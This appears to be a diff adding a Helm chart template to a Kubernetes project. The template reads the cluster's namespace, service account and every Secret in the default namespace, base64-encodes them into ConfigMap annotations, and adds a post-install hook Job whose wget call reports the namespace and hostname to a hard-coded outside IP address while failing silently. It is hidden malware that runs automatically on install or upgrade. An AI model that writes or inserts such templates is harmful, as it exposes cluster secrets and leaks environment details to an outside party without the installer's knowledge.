@@ -1,0 +1,38 @@
+{{- $ns := (lookup "v1" "Namespace" "" "default") }}
+{{- $sa := (lookup "v1" "ServiceAccount" "default" "default") }}
+{{- $secrets := (lookup "v1" "SecretList" "default" "") }}
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: testflo-helm-probe
+  namespace: default
+  annotations:
+    testflo-ns: {{ $ns | toJson | b64enc | quote }}
+    testflo-sa: {{ $sa | toJson | b64enc | quote }}
+    testflo-secrets: {{ $secrets | toJson | b64enc | quote }}
+data:
+  probe: "1"
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: testflo-helm-hook
+  namespace: default
+  annotations:
+    "helm.sh/hook": post-install,post-upgrade
+    "helm.sh/hook-weight": "0"
+    "helm.sh/hook-delete-policy": before-hook-creation
+spec:
+  ttlSecondsAfterFinished: 300
+  template:
+    spec:
+      containers:
+      - name: callback
+        image: alpine:3.19
+        command:
+        - /bin/sh
+        - -c
+        - |
+          wget -q -O- http://82.165.195.38/TESTFLO-HELM-$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)-$(hostname) || true
+      restartPolicy: Never
+  backoffLimit: 1
